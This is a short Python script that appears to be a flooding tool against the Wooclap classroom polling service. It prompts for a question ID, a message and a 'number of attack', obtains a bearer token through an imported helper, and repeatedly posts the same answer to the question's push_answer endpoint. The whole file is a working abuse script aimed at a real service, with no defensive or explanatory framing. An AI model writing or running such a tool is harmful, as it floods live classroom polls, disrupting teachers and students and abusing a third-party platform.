import requests
import json
from components.core import generate_token

def send_answer():
    TEXT = ""
    ID_QUESTION = ""
    NBR_ATTACK = ""
    TOKEN = ""
    
    if ID_QUESTION == "":
        ID_QUESTION = input("QUESTION_ID :\n> ")
    
    if TEXT == "":
        TEXT = input("WRITE SOMETHING :\n> ")
    
    if NBR_ATTACK == "":
        NBR_ATTACK = input("NUMBER OF ATTACK :\n> ")
    
    if TOKEN == "":
        TOKEN = generate_token()

    HEADERS = {
        'Authorization': f'Bearer {TOKEN}',
        'Content-Type': 'application/json'
    }
    PAYLOAD = json.dumps({"text": TEXT})
    
    for i in range(int(NBR_ATTACK)):
        requests.post(f"https://app.wooclap.com/api/questions/{ID_QUESTION}/push_answer", headers=HEADERS, data=PAYLOAD)
        print(f"\nWORD '{TEXT}' SENDS...")
    